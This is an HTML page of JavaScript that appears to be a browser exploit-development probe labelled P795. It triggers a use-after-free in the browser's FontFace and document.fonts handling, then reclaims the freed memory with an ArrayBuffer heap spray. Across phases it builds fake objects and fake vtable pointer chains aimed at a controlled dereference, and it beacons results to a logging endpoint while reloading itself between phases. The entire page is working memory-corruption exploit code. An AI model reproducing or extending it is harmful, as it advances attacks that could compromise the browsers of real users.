<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P795 — NULL + Chain Map</title>
<style>
  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; }
  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; color: #7ee787; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
</style>
<script>
'use strict';
/* ============================================================
 * P795 — NULL + Chain Map
 *
 * P794 CONFIRMED: engine dereferences [q1+0] = q13 slot.
 * 0x4242... → crash. Self-ref → crash. NULL test was
 * inconclusive (crashed before P1-HIT, likely bad luck).
 *
 * This probe retries NULL plus tests the chain model:
 *
 * Phase A: q13 = 0 (NULL) → survive? (retry of P794 phase 0)
 * Phase B: q13 = 1 (non-NULL invalid) → crash? (confirm check)
 * Phase C: q13 = q11-0x68+0x10 → points to q2 in our AB;
 *          q2 = 0 (NULL vtable/first-field of fake object)
 *          → test if engine NULL-checks the SECOND deref
 * Phase D: q13 = q11-0x68+0x10 → points to q2 in our AB;
 *          q2 = q11-0x68+0x20 (self vtable at q4)
 *          q4..q10 = 0 (zeroed fake vtable)
 *          → test full 3-level chain
 *
 * CRASH_CLASS: HIGH — controlled pointer chain
 * ============================================================ */

window.onerror = function(msg, url, line){
  try { var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P795-JSERR&data=' + encodeURIComponent((msg||'') + ' L' + line) + '&t=' + Date.now(), false);
    x.send(null); } catch(e){}
};

function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }

function b(tag, data){
  try { var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P795-' + encodeURIComponent(tag) +
      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
    x.send(null); } catch(e){}
}

var out;
function log(s){ if(out) out.textContent += s + '\n'; }

function getPhase(){
  try { return localStorage.getItem('p795_phase') || 'A'; }
  catch(e){ return 'A'; }
}
function setPhase(p){
  try { localStorage.setItem('p795_phase', p); } catch(e){}
}

function run(){
  out = document.getElementById('out');
  out.textContent = '';

  var phase = getPhase();
  b('BOOT', 'phase=' + phase);
  log('P795 — Phase ' + phase + '\n');

  if (phase === 'A'){
    setPhase('B');
    log('Phase A: q13 = 0 (NULL sub-pointer)');
    doTest('A', function(view1, q11_1){
      /* Just zero q13 — NULL test */
      view1[13] = 0n;
      view1[14] = 0n;
      view1[15] = 0n;
      view1[16] = 0n;
      b('A-SET', 'q13=0');
    });
  } else if (phase === 'B'){
    setPhase('C');
    log('Phase B: q13 = 1 (non-NULL invalid)');
    doTest('B', function(view1, q11_1){
      view1[13] = 1n;
      view1[14] = 0n;
      view1[15] = 0n;
      view1[16] = 0n;
      b('B-SET', 'q13=1');
    });
  } else if (phase === 'C'){
    setPhase('D');
    log('Phase C: q13 → q2 (fake object), q2 = 0 (NULL vtable)');
    doTest('C', function(view1, q11_1){
      var self_addr = q11_1 - 0x68n;
      /* q13 points to q2 (offset 0x10 from AB start) */
      view1[13] = self_addr + 0x10n;
      /* q2 = 0 (NULL first field / vtable pointer) */
      view1[2] = 0n;
      view1[3] = 0n;
      view1[14] = 0n;
      view1[15] = 0n;
      b('C-SET', 'q13=self+0x10|q2=0|self=0x' + h16(self_addr));
    });
  } else if (phase === 'D'){
    setPhase('E');
    log('Phase D: q13 → q2 (fake obj), q2 → q4 (fake vtable), q4-q10 = 0');
    doTest('D', function(view1, q11_1){
      var self_addr = q11_1 - 0x68n;
      /* q13 → q2 (fake object at AB+0x10) */
      view1[13] = self_addr + 0x10n;
      /* q2 → q4 (fake vtable at AB+0x20) */
      view1[2] = self_addr + 0x20n;
      view1[3] = 0n;
      /* Fake vtable: all zeros (NULL function pointers) */
      view1[4] = 0n;
      view1[5] = 0n;
      view1[6] = 0n;
      view1[7] = 0n;
      view1[8] = 0n;
      view1[9] = 0n;
      view1[10] = 0n;
      view1[14] = 0n;
      view1[15] = 0n;
      b('D-SET', 'q13=self+0x10|q2=self+0x20|q4-q10=0|self=0x' + h16(self_addr));
    });
  } else if (phase === 'E'){
    setPhase('F');
    log('Phase E: q13 → q2 (fake obj), q2 → q4, q4 = 0x4242... (crash vtable entry)');
    doTest('E', function(view1, q11_1){
      var self_addr = q11_1 - 0x68n;
      view1[13] = self_addr + 0x10n;
      view1[2] = self_addr + 0x20n;
      view1[3] = 0n;
      /* Fake vtable entry 0 = crash marker */
      view1[4] = 0x4242424242424242n;
      view1[5] = 0n;
      view1[6] = 0n;
      view1[7] = 0n;
      view1[8] = 0n;
      view1[9] = 0n;
      view1[10] = 0n;
      view1[14] = 0n;
      view1[15] = 0n;
      b('E-SET', 'q13=self+0x10|q2=self+0x20|q4=0x4242|self=0x' + h16(self_addr));
    });
  } else {
    log('All phases complete! Check beacons.');
    b('ALLCOMPLETE', '');
    try { localStorage.removeItem('p795_phase'); } catch(e){}
  }
}

function doTest(label, setupFn){
  /* Pass 1: zeroed UAF */
  var st1 = document.createElement('style');
  st1.textContent = '@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(st1);

  var face1 = new FontFace('f1', 'local(Helvetica)', { unicodeRange: 'U+0041' });
  document.fonts.add(face1);
  void face1.loaded;

  var abs1 = [], fired1 = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if (fired1) return undefined;
      fired1 = true;
      if (st1){ st1.remove(); st1.textContent = ''; st1 = null; }
      try { document.fonts.delete(this); } catch(e){}
      document.body.offsetHeight;
      for (var k = 0; k < 64; k++) abs1.push(new ArrayBuffer(192));
      try { document.fonts.check('1em bb1'); } catch(e){}
      document.body.offsetHeight;
      return undefined;
    },
    set: function(){}
  });

  document.fonts.load('1em f1, bb1', 'AB');

  setTimeout(function(){
    delete FontFace.prototype.then;

    var best1 = -1;
    for (var i = 0; i < abs1.length; i++){
      var v = new BigUint64Array(abs1[i]);
      if (v[0] === 1n){ best1 = i; break; }
    }
    if (best1 < 0){
      b(label + '-P1-MISS', 'no_reclaim');
      log('Pass 1 MISS. Retrying same phase...');
      /* DON'T advance phase — retry */
      var curPhases = { A:'A', B:'B', C:'C', D:'D', E:'E' };
      setPhase(label);
      setTimeout(function(){ location.reload(); }, 500);
      return;
    }

    var view1 = new BigUint64Array(abs1[best1]);
    var q11_1 = view1[11];
    var q13_1 = view1[13];

    b(label + '-P1-HIT', 'q11=0x' + h16(q11_1) + '|q13=0x' + h16(q13_1));
    log('P1 HIT: q11=0x' + h16(q11_1));

    /* Apply test-specific modifications to pass1 AB */
    setupFn(view1, q11_1);

    /* Warmup */
    for (var i = 0; i < 128; i++) new ArrayBuffer(192);

    /* Pass 2: q1 = q11 → engine follows into our modified data */
    var st2 = document.createElement('style');
    st2.textContent = '@font-face{font-family:bb2;src:local(Arial);unicode-range:U+0044;}';
    document.head.appendChild(st2);

    var face2 = new FontFace('f2', 'local(Helvetica)', { unicodeRange: 'U+0043' });
    document.fonts.add(face2);
    void face2.loaded;

    var abs2 = [], fired2 = false;
    Object.defineProperty(FontFace.prototype, 'then', {
      configurable: true,
      get: function(){
        if (fired2) return undefined;
        fired2 = true;
        if (st2){ st2.remove(); st2.textContent = ''; st2 = null; }
        try { document.fonts.delete(this); } catch(e){}
        document.body.offsetHeight;

        for (var k = 0; k < 64; k++){
          var ab = new ArrayBuffer(192);
          var v = new BigUint64Array(ab);
          v[1] = q11_1;
          abs2.push(ab);
        }

        try { document.fonts.check('1em bb2'); } catch(e){}
        document.body.offsetHeight;
        return undefined;
      },
      set: function(){}
    });

    document.fonts.load('1em f2, bb2', 'CD');

    setTimeout(function(){
      delete FontFace.prototype.then;

      var best2 = -1;
      for (var i = 0; i < abs2.length; i++){
        var v = new BigUint64Array(abs2[i]);
        if (v[0] === 1n){ best2 = i; break; }
      }

      if (best2 < 0){
        b(label + '-P2-MISS', 'no_reclaim');
        log('Pass 2 MISS');
      } else {
        var view2 = new BigUint64Array(abs2[best2]);
        b(label + '-P2-HIT', 'i=' + best2 +
          '|q0=0x' + h16(view2[0]) +
          '|q1=0x' + h16(view2[1]) +
          '|q11=0x' + h16(view2[11]) +
          '|q13=0x' + h16(view2[13]));
        log('P2 HIT (#' + best2 + '):');
        for (var q = 0; q < 24; q++){
          if (view2[q] !== 0n) log('  q' + q + ' = 0x' + h16(view2[q]));
        }

        /* Check pass1 AB for side-effects */
        var sideEffects = [];
        for (var q = 0; q < 24; q++){
          /* Skip fields we set or engine always writes */
          if (q === 0 || q === 11 || q === 12) continue;
          var v = view1[q];
          if (q === 13 || q === 14 || q === 15 || q === 16) continue; /* we modified these */
          if (q === 2 || q === 3 || q === 4 || q === 5 || q === 6 ||
              q === 7 || q === 8 || q === 9 || q === 10) continue; /* we may have set these */
          if (v !== 0n) sideEffects.push('q' + q + '=0x' + h16(v));
        }
        if (sideEffects.length > 0){
          b(label + '-SIDEEFFECT', sideEffects.join('|'));
          log('Pass1 AB side-effects: ' + sideEffects.join(', '));
        }
      }

      b(label + '-SURVIVED', 'pass2_ok');
      log('\n*** SURVIVED — engine did NOT crash with this chain! ***\n');

      /* Auto-reload for next phase */
      setTimeout(function(){ location.reload(); }, 500);
    }, 500);
  }, 400);
}

if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
else document.addEventListener('DOMContentLoaded', run);
</script>
</head>
<body>
  <pre id="out">P795 — Loading...</pre>
</body>
</html>
